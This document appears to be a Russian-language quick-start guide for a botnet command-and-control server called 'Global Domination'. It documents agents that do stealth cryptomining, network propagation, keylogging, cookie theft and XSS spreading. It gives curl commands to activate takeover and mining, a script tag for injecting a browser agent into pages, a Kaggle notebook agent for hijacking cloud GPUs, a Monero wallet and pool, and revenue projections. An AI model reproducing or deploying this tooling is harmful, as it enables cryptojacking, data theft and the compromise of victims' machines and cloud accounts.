# C2 Server - Quick Start Guide

## ─── ЗАПУСК СИСТЕМЫ ───

### 1. Запуск C2 сервера

```bash
cd /mnt/F/C2_server-main

# Установка зависимостей (если нужно)
pip install -r requirements.txt

# Запуск сервера
python3 run_unified.py --host 0.0.0.0 --port 5000

# Или через gunicorn (production)
gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker -w 1 -b 0.0.0.0:5000 src.c2.server:app
```

### 2. Доступ к интерфейсам

```
Main Dashboard:    http://localhost:5000/
Global Domination: http://localhost:5000/domination
API Health:        http://localhost:5000/api/health
```

### 3. Авторизация

```
Username: admin
Password: admin
```

---

## ─── СТРУКТУРА СИСТЕМЫ ───

```
┌─────────────────────────────────────────────────────────────┐
│                    C2 SERVER (Flask)                        │
│                    localhost:5000                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │   Dashboard │  │ Domination   │  │    API      │         │
│  │      /      │  │  /domination │  │   /api/*    │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    SQLite Database                          │
│                    data/c2.db                                │
├─────────────────────────────────────────────────────────────┤
│  agents       - Зарегистрированные агенты                   │
│  tasks        - Задачи для агентов                          │
│  agent_data   - Собранные данные                            │
│  logs         - Логи системы                                 │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    АГЕНТЫ                                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Universal Agent (Python)     Browser Agent (JS)            │
│  ├── Stealth Mining           ├── Fingerprinting            │
│  ├── Propagation              ├── Cookie Collection         │
│  ├── Data Collection          ├── Keylogger                 │
│  └── Command Execution        └── XSS Spread                │
│                                                             │
│  Cloud Agents (Kaggle/Colab/Modal)                          │
│  ├── GPU Mining                                              │
│  └── Compute Tasks                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## ─── API ENDPOINTS ───

### Управление агентами
```bash
# Список агентов
curl http://localhost:5000/api/agents

# Регистрация агента
curl -X POST http://localhost:5000/api/agent/register \
  -H "Content-Type: application/json" \
  -d '{"id":"test-001","hostname":"test-pc","os":"Linux"}'

# Получить задачи агента
curl http://localhost:5000/api/agent/tasks?agent_id=test-001

# Отправить результат
curl -X POST http://localhost:5000/api/agent/result \
  -H "Content-Type: application/json" \
  -d '{"task_id":"xxx","result":"completed"}'
```

### Global Domination
```bash
# Статус сети
curl http://localhost:5000/api/domination/status

# Активация захвата
curl -X POST http://localhost:5000/api/domination/activate \
  -H "Content-Type: application/json" \
  -d '{"propagation":true,"mining":true,"data_collection":true}'

# Кошелёк
curl http://localhost:5000/api/domination/wallet

# Оценка дохода
curl http://localhost:5000/api/domination/estimate
```

### Stealth Mining
```bash
# Запуск майнинга на всех агентах
curl -X POST http://localhost:5000/api/mining/stealth/start \
  -H "Content-Type: application/json" \
  -d '{"throttle":0.3}'

# Остановка
curl -X POST http://localhost:5000/api/mining/stealth/stop

# Статус
curl http://localhost:5000/api/mining/stealth/status
```

### Browser Mining
```bash
# Статистика браузерного майнинга
curl http://localhost:5000/api/mining/browser/stats

# Инъекционный скрипт
curl http://localhost:5000/api/mining/browser/inject
```

---

## ─── ЗАПУСК АГЕНТА ───

### Universal Agent (Linux/Windows/macOS)

```bash
# Установка переменных окружения
export C2_URL="http://your-server:5000"
export GLOBAL_WALLET="44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
export GLOBAL_POOL="pool.hashvault.pro:80"

# Запуск агента
python3 src/agents/universal.py
```

### Browser Agent

```html
<!-- Вставить в HTML страницу -->
<script src="http://your-server:5000/static/js/agent_browser.js"></script>
```

### Kaggle Agent

```python
# В Kaggle Notebook
!pip install git+https://github.com/GaredBerns/C2_server
from src.agents.kaggle import run_agent
run_agent("http://your-server:5000")
```

---

## ─── WEBSOCKET СОБЫТИЯ ───

```javascript
// Подключение к WebSocket
const socket = io('http://localhost:5000');

// Нов агент зарегистрирован
socket.on('agent_registered', (data) => {
    console.log('New agent:', data.agent_id);
});

// Результат задачи
socket.on('task_result', (data) => {
    console.log('Task completed:', data.task_id);
});

// Активация захвата
socket.on('global_domination', (data) => {
    console.log('Domination activated on', data.agents_targeted, 'agents');
});

// Статистика майнинга
socket.on('mining_stats', (data) => {
    console.log('Mining stats:', data);
});
```

---

## ─── КОНФИГУРАЦИЯ ───

### Переменные окружения сервера

```bash
# Кошельки
GLOBAL_WALLET="44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
GLOBAL_POOL="pool.hashvault.pro:80"
BTC_WALLET="your_btc_address"
ETH_WALLET="your_eth_address"

# Telegram C2 (опционально)
TG_BOT_TOKEN="your_bot_token"
TG_CHAT_ID="your_chat_id"

# Безопасность
AGENT_TOKEN="secret_token_for_agents"
ENCRYPTION_KEY="32_byte_encryption_key"
```

### Переменные окружения агента

```bash
C2_URL="http://server:5000"     # URL C2 сервера
SLEEP="30"                       # Интервал beacon (сек)
JITTER="5"                       # Случайная задержка (%)
AUTH_TOKEN="secret_token"        # Токен авторизации
ENC_KEY="encryption_key"         # Ключ шифрования
```

---

## ─── ТИПЫ ЗАДАЧ ───

| Task Type | Описание | Payload |
|-----------|----------|---------|
| `cmd` | Shell команда | `{"cmd":"whoami"}` |
| `exec` | Python код | `print("hello")` |
| `download` | Скачать файл | `/path/to/file` |
| `upload` | Загрузить файл | `path\|base64_data` |
| `propagate` | Распространение | `{"method":"network"}` |
| `collect` | Сбор данных | `{"collect_type":"all"}` |
| `stealth_mining_start` | Запуск майнинга | `{"throttle":0.3}` |
| `stealth_mining_stop` | Остановка | - |
| `global_domination` | Полный захват | `{"mining":true}` |
| `browser_inject` | Инъекция в браузер | `wallet_address` |

---

## ─── МОНИТОРИНГ ───

### Dashboard (/)
- Общая статистика агентов
- Список всех устройств
- Задачи и логи
- Графики активности

### Domination Dashboard (/domination)
- **Stats Grid**: Total agents, Online, Mining, Data records, Hashrate, Est. daily
- **Agent List**: Все агенты с платформой и статусом
- **Control Panel**: Кнопки управления
- **Mining Stats**: Browser и Native hashrate
- **Activity Log**: Real-time лог событий

### WebSocket Events
- `agent_registered` - Новый агент
- `task_result` - Результат задачи
- `global_domination` - Активация захвата
- `mining_stats` - Статистика майнинга

---

## ─── ПОТЕНЦИАЛ СИСТЕМЫ ───

### При 1000 агентов:
- Hashrate: ~50 kH/s
- Daily: ~$50
- Monthly: ~$1,500

### При 1M агентов:
- Hashrate: ~50 MH/s
- Daily: ~$50,000
- Monthly: ~$1,500,000

### При 1B агентов:
- Hashrate: ~50 GH/s
- Daily: ~$5,000,000
- Monthly: ~$150,000,000

---

## ─── ФАЙЛЫ СИСТЕМЫ ───

```
/mnt/F/C2_server-main/
│
├── src/
│   ├── c2/server.py           # Main server (7400+ lines)
│   ├── agents/universal.py    # Universal agent (2100+ lines)
│   └── autoreg/engine.py      # Auto-registration
│
├── templates/
│   ├── dashboard.html         # Main dashboard
│   └── domination.html        # Domination control center
│
├── static/
│   ├── js/agent_browser.js    # Browser agent
│   └── mining/inject.html     # Mining injection
│
├── data/
│   └── c2.db                  # SQLite database
│
├── ARCHITECTURE.md            # Full architecture docs
├── QUICKSTART.md              # This file
└── run_unified.py             # Entry point
```

---

## ─── TROUBLESHOOTING ───

### Сервер не запускается
```bash
# Проверить порт
lsof -i :5000

# Проверить зависимости
pip install flask flask-socketio flask-bcrypt
```

### Агент не подключается
```bash
# Проверить URL
curl http://server:5000/api/health

# Проверить токен
curl -H "X-Auth-Token: your_token" http://server:5000/api/agent/tasks
```

### WebSocket не работает
```bash
# Установить gevent
pip install gevent gevent-websocket

# Запустить с gevent
gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker -w 1 -b 0.0.0.0:5000 src.c2.server:app
```
